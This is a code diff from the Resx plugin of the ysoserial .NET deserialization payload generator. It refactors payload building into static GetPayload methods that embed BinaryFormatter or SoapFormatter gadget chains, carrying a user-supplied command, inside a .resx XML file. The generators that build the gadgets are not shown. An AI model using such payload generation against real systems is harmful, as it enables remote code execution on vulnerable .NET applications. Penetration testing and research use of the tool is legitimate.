@@ -63,7 +63,7 @@ namespace ysoserial.Plugins
             try
             {
                 extra = options.Parse(args);
-                inputArgs.CmdFullString = command;
+                inputArgs.Cmd = command;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
             }
@@ -74,10 +74,18 @@ namespace ysoserial.Plugins
                 Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                 System.Environment.Exit(-1);
             }
+
+            return GetPayload(mode, file, inputArgs);
+        }
+
+        public static string GetPayload(string mode, InputArgs inputArgs)
+        {
+            return GetPayload(mode, "", inputArgs);
+        }
+        public static string GetPayload(string mode, string file, InputArgs inputArgs) { 
             String mtype = "";
             String payloadValue = "";
-            string payload = @"<?xml version=""1.0"" encoding=""utf-8""?>
-<root>
+            string payload = @"<root>
  <xsd:schema id=""root"" xmlns="""" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
  <xsd:import namespace=""http://www.w3.org/XML/1998/namespace"" />
  <xsd:element name=""root"" msdata:IsDataSet=""true"">
@@ -152,7 +160,7 @@ namespace ysoserial.Plugins
                     }
                     break;
                 case "binaryformatter":
-                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
+                    if (!String.IsNullOrEmpty(inputArgs.CmdFullString) && !String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                     {
                         mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
                         byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
@@ -162,7 +170,7 @@ namespace ysoserial.Plugins
                     break;
                 case "soapformatter":
                     mtype = @"mimetype=""application/x-microsoft.net.object.soap.base64""";
-                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
+                    if (!String.IsNullOrEmpty(inputArgs.CmdFullString) && !String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                     {
                         byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().GenerateWithNoTest("SoapFormatter", inputArgs);
                         payloadValue = Convert.ToBase64String(osf);
@@ -179,13 +187,13 @@ namespace ysoserial.Plugins
             {
                 Console.Write("ysoserial: ");
                 Console.WriteLine("Incorrect plugin mode/arguments combination");
-                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
+                Console.WriteLine("Try 'ysoserial -p Resx --help' for more information.");
                 System.Environment.Exit(-1);
             }
 
             payload = String.Format(payload, mtype, payloadValue);
 
-            if (minify)
+            if (inputArgs.Minify)
             {
                 payload = XMLMinifier.Minify(payload, null, null);
             }
